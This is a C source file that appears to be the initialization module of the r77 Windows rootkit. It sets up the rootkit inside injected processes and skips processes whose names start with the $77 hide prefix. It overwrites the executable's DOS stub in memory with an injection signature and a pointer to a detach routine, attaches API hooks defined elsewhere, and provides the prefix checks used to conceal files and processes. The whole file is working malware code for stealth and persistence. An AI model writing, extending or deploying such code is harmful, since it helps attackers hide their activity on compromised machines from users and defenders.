#include "Rootkit.h"
#include "Hooks.h"
#include "Config.h"
#include "r77def.h"
#include <Shlwapi.h>

static BOOL RootkitInitialized;

BOOL InitializeRootkit()
{
	// If the process starts with $77, do not load r77.
	WCHAR executablePath[MAX_PATH + 1];
	if (FAILED(GetModuleFileNameW(NULL, executablePath, MAX_PATH))) return FALSE;
	if (HasPrefix(PathFindFileNameW(executablePath))) return FALSE;

	// Write the r77 header.
	if (!WriteR77Header()) return FALSE;

	if (!RootkitInitialized)
	{
		RootkitInitialized = TRUE;

		// Initialize configuration system.
		InitializeConfig();

		// Attach hooks.
		InitializeHooks();
	}

	return TRUE;
}
VOID UninitializeRootkit()
{
	if (RootkitInitialized)
	{
		RootkitInitialized = FALSE;

		// Remove the r77 header.
		RemoveR77Header();

		// Uninitialize configuration system.
		UninitializeConfig();

		// Detach hooks.
		UninitializeHooks();
	}
}
static VOID DetachRootkit()
{
	UninitializeRootkit();
}

static BOOL WriteR77Header()
{
	BOOL result = FALSE;

	// Store the r77 header in the main module.
	LPBYTE module = (LPBYTE)GetModuleHandleW(NULL);
	if (module)
	{
		// The r77 header is written over the DOS stub.
		LPWORD signature = (LPWORD) & module[sizeof(IMAGE_DOS_HEADER)];

		// If this process already has an r77 signature, indicate that the DLL should be detached by returning false.
		if (*signature != R77_SIGNATURE && *signature != R77_SERVICE_SIGNATURE && *signature != R77_HELPER_SIGNATURE)
		{
			DWORD oldProtect;
			if (VirtualProtectEx(GetCurrentProcess(), module, 512, PAGE_READWRITE, &oldProtect))
			{
				// The current process is now marked as injected and therefore, cannot be injected again.
				*signature = R77_SIGNATURE;

				// Write a function pointer to DetachRootkit() that can be invoked using NtCreateThreadEx to detach r77 from this process.
				*(PDWORD64)&module[sizeof(IMAGE_DOS_HEADER) + 2] = (DWORD64)DetachRootkit;

				VirtualProtectEx(GetCurrentProcess(), module, 512, oldProtect, &oldProtect);
				result = TRUE;
			}
		}
	}

	return result;
}
static VOID RemoveR77Header()
{
	LPBYTE module = (LPBYTE)GetModuleHandleW(NULL);
	if (module)
	{
		DWORD oldProtect;
		if (VirtualProtectEx(GetCurrentProcess(), module, 512, PAGE_READWRITE, &oldProtect))
		{
			// Remove the r77 header by overwriting the DOS stub.
			// Even if this sequence of bytes doesn't match the original DOS stub, it does not affect the process.
			*(LPWORD)&module[sizeof(IMAGE_DOS_HEADER)] = 0x1f0e;
			*(PDWORD64)&module[sizeof(IMAGE_DOS_HEADER) + 2] = 0xb821cd09b4000eba;

			VirtualProtectEx(GetCurrentProcess(), module, 512, oldProtect, &oldProtect);
		}
	}
}

BOOL HasPrefix(LPCWSTR str)
{
	return str && !StrCmpNIW(str, HIDE_PREFIX, HIDE_PREFIX_LENGTH);
}
BOOL HasPrefixU(UNICODE_STRING str)
{
	return str.Buffer && str.Length / sizeof(WCHAR) >= HIDE_PREFIX_LENGTH && !StrCmpNIW(str.Buffer, HIDE_PREFIX, HIDE_PREFIX_LENGTH);
}